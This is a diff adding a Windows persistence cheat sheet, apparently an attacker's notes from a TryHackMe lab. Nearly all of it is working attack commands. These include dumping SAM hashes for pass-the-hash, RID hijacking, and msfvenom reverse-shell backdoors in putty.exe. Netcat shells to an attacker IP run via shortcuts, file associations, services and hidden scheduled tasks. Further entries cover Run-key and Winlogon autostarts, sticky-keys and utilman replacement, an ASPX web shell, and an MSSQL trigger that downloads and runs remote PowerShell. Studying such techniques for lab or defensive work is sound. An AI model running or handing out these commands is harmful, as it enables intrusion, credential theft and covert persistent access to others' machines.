@@ -1,0 +1,196 @@
+### persistence ###
+###########
+## links ##
+###########
+https://tryhackme.com/room/windowslocalpersistence
+https://www.hexacorn.com/blog/category/autostart-persistence/
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md
+
+
+########################################
+## add group to unprivileged accounts ##
+########################################
+# after gaining admin access
+net localgroup administrators USERNAME /add				# add USERNAME to admin (winrm,rdp) group
+net localgroup "Backup Operators" USERNAME /add				# add to backup group, read/write all	
+net localgroup "Remote Management Users" USERNAME /add			# add to WinRM group
+net localgroup "Remote Desktop Users" USERNAME /add			# add to RDP group
+
+# after adding to backup & winrm group
+# active the stripped right from backup group (from the admin account)
+> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
+evil-winrm -i $h -u USERNAME -p PASSWORD				# co with winrm
+> whoami /groups							# check if backup group is active
+
+# proceed with backup of SAM and SYSTEM (if password of account changed)
+> reg save hklm\system system.bak
+> reg save hklm\sam sam.bak
+> download system.bak /full/path/system.bak
+> download sam.bak /full/path/sam.back
+secretsdump.py -sam sam.bak -system system.bak LOCAL			# recover hash
+evil-winrm -i 10.10.166.238 -u Administrator -H HASH			# re-connect to admin account with hash
+
+
+#####################################
+## add privilege to unpriv account ##
+#####################################
+secedit /export /cfg config.inf						# export priv configs
+# update the config, add SeBackupPrivilege & SeRestorePrivilege to user
+secedit /import /cfg config.inf /db config.sdb				# convert to .sdb
+secedit /configure /db config.sdb /cfg config.inf			# load config
+# add user to winrm group
+# or add the right: add user, check Full Control
+PS> Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
+# and active the stripped right from backup group (from the admin account) (see up)
+
+
+###################
+## RID Hijacking ##
+###################
+# tamper registry value to make windows assign admin access token
+PsExec64.exe -i -s regedit						# launch regedit
+# go to HKLM\SAM\SAM\Domains\Account\Users\ 
+# someuser            S-1-5-21-1966530601-3185510712-10604624-1010	# 1010 => 0x3F2 => F2 03 (little endian)
+# hex edit the "F" value and replace F203 with 500 => 0x1F4 => F4 01
+
+
+####################
+## Backdoor Files ##
+####################
+# backdoor a putty.exe file
+msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=10.8.98.114 lport=4444 -b "\x00" -f exe -o puttyX.exe
+# backdoor shortcurt
+# backdoor.ps1
+Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.8.98.114 4444"
+C:\Windows\System32\calc.exe
+# target shortcurt:
+powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
+# and change icon
+
+
+##########################
+## Hijacking File assoc ##
+##########################
+# replace default prog for .txt file
+HKLM\Software\Classes\txtfile\shell\open\command
+powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1 %1
+
+
+######################
+## Abusing services ##
+######################
+# create backdoor services
+# reset admin password
+sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
+sc.exe start THMservice
+# rshell service
+ATT> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.14.32.190 LPORT=4444 -f exe-service -o rev-svc.exe
+PWN> sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
+PWN> sc.exe start THMservice2
+
+# modifying existing services
+PWN> sc.exe query state=all							# list avalaible services
+PWN> sc.exe qc THMService3							# find stopped service and check it
+# service should start auto, prefered with system priv
+# reconfig the service
+PWN> sc.exe config THMservice3 binPath= "C:\Windows\rev-svc.exe" start= auto obj= "LocalSystem"
+
+
+#####################
+## Scheduled tasks ##
+#####################
+# run a task every minute
+PWN> schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe 10.14.32.190 4444" /ru SYSTEM
+PWN> schtasks /query /tn thm-taskbackdoor					# inspect new task
+# then disable task to be listed by removing right on it.
+# HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
+PWN> c:\tools\pstools\PsExec64.exe -s -i regedit				# regedit with system privs
+# delete the SD line
+
+
+#######################
+## logon persistence ##
+#######################
+# startup folder
+# C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+# C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp				# for all user
+# create rshell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.14.32.190 LPORT=4444 -f exe -o rshell.exe
+PWN PS> wget http://10.14.32.190/rshell.exe -O rshell.exe				# download rshell
+PWN> copy rshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"	# copy it
+
+# with registry
+# HKCU > Current user
+# HKLM > All user
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+leaHKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+PWN> regedit										# add new REG_EXPAND_SZ
+
+# with winlogon
+# winlogin reg keys are:
+HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\
+	Userinit > userinit.exe
+	shell > exporer.exe
+Userinit > C:\Windows\system32\userinit.exe, C:\Windows\rshell.exe			# just append cmd in reg
+
+# login script
+# userinit.exe check env var UserInitMprLogonScript
+# add it in HKCU\Environment
+UserInitMprLogonScript | REG_EXPAND_SZ | C:\Windows\rshell.exe
+
+
+##################
+## login screen ##
+##################
+# Stikey key
+# After pressing SHIFT 5 times, windows will exec C:\Windows\System32\sethc.exe
+PWN> takeown /f c:\Windows\System32\sethc.exe
+PWN> icacls C:\Windows\System32\sethc.exe /grant Administrator:F
+PWN> copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+
+# Utilman
+# built-in windows app, provide Ease of Access option on lock screen
+PWN> takeown /f c:\Windows\System32\utilman.exe
+PWN> icacls C:\Windows\System32\utilman.exe /grant Administrator:F
+PWN> copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+
+
+###############
+## web shell ##
+###############
+# link: https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx
+PWN> cd C:\inetpub\wwwroot\
+PWN> wget http://10.14.32.190/shell.aspx -O shell.aspx
+PWN> icacls shell.aspx /grant Everyone:F
+
+
+####################
+## MSSQL backdoor ##
+####################
+# use triggers in MSSQL
+# first enable xp_cmdshell
+sp_configure 'Show Advanced Options',1;
+RECONFIGURE;
+GO
+sp_configure 'xp_cmdshell',1;
+RECONFIGURE;
+GO
+
+# allow everyone to use xp_cmdshell
+USE master
+GRANT IMPERSONATE ON LOGIN::sa to [Public];
+
+# use a used db
+USE HRDB
+
+# create trigger
+CREATE TRIGGER [sql_backdoor]
+ON HRDB.dbo.Employees 
+FOR INSERT AS
+EXECUTE AS LOGIN = 'sa'
+EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://10.14.32.190/rshell.ps1'')"';
+# see /home/tristan/perso/secu/rshell/rshell.ps1
+
+
